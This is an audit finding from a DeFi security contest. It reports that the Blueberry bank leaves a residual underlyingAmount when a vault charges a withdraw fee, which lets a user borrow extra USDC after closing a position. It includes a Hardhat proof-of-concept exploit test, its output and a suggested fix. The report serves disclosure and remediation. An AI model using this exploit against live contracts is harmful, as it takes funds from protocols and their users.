evan

medium

# Underlying amount after withdrawLend is incorrect if hard/soft vault has withdraw fee

## Summary
The accounting for hard/soft vault withdraw fee is incorrect. It's possible for underlyingAmount to be >0 even when the position is fully closed. This will allow user to borrow more assets without needing to lend anything.

## Vulnerability Detail
https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/vault/SoftVault.sol#L118
^^ Observe that the withdrawAmount returned by softVault does not include the fee.

https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L698
^^ blueBerryBank subtracts the withdrawAmount returned by softVault from pos.underlyingAmount. Therefore, the fee is not subtracted from the underlyingAmount.

After fully closing their position, the user can use this bonus underlyingAmount to borrow a small amount of assets (making sure that the risk doesn't exceed the liquidation threshold even when the position value is 0) and retrieve it by calling closePosition with `lpTakeAmt`=max, `amountRepay` = `amountShareWithdraw` = `amountLpWithdraw` = 0.

## Impact
Without lending any extra assets, the user can still borrow more assets after fully closing a position. The assets that they borrowed for free can be retrieved, effectively allowing the user to avoid the withdraw vault fee.

## Code Snippet
Please put this test in bank.test.ts, and run `yarn hardhat test --grep Vuln4`
```javascript
	describe("Vuln4", () => {
		const depositAmount = utils.parseUnits('100', 18);
		const borrowAmount = utils.parseUnits('300', 6);
		
		const iface = new ethers.utils.Interface(SpellABI);

		beforeEach(async () => {
			await usdc.approve(bank.address, ethers.constants.MaxUint256);
			await ichi.approve(bank.address, ethers.constants.MaxUint256);
			await bank.execute(
				0,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					USDC,
					depositAmount,
					borrowAmount
				])
			)
			config.startVaultWithdrawFee();
		})
		it("incorrect underlyingAmount", async () => {
			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			await usdc.transfer(spell.address, utils.parseUnits('10', 6));
			console.log("user original underlyingAmount: ")
			let posInfo = await bank.getPositionInfo(1);
			console.log(posInfo.underlyingAmount);

			await bank.execute(
				1,
				spell.address,
				iface.encodeFunctionData("closePosition", [
					0,
					ICHI,
					USDC, // ICHI vault lp token is collateral
					ethers.constants.MaxUint256,	// Amount of werc20
					ethers.constants.MaxUint256,  // Amount of repay
					0,
					ethers.constants.MaxUint256,
				])
			)
			console.log("user underlyingAmount after fully closing position: ")
			posInfo = await bank.getPositionInfo(1);
			console.log(posInfo.underlyingAmount);
			
			console.log("user usdc balance before: ")
			console.log(await usdc.balanceOf(admin.address));
			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			await bank.execute(
				1,
				spell.address,
				iface.encodeFunctionData("openPosition", [
					0,
					ICHI,
					USDC,
					0,
					utils.parseUnits('2', 6)
				])
			);
			await ichiVault.rebalance(-260400, -260200, -260800, -260600, 0);
			await bank.execute(
				1,
				spell.address,
				iface.encodeFunctionData("closePosition", [
					0,
					ICHI,
					USDC,
					ethers.constants.MaxUint256,
					0, 
					0,
					0,
				])
			)
			console.log("user usdc balance after: ")
			console.log(await usdc.balanceOf(admin.address));
		})
	})
```
Relevant output:
```plaintext
user original underlyingAmount: 
BigNumber { value: "99500000000000000000" }
user underlyingAmount after fully closing position: 
BigNumber { value: "995000000000000000" }
user usdc balance before: 
BigNumber { value: "37306263596" }
user usdc balance after: 
BigNumber { value: "37308252977" }
```
Observe that the user's underlyingAmount is not 0 even after fully closing a position. The user takes advantage of this to get around 2 
extra USDC. If the user had a larger initial position, then this value will be much more significant (~= 1% (withdrawVaultFee) of the original underlying amount).

## Tool used
Hardhat
Manual Review

## Recommendation
https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/vault/SoftVault.sol#L118
The withdraw function in soft/hardVault should return both the withdrawAmount without the fee deducted and the amount with the fee deducted.

https://github.com/sherlock-audit/2023-02-blueberry/blob/main/contracts/BlueBerryBank.sol#L698-L699
These 2 lines should use the the withdrawAmount without the fee deducted.
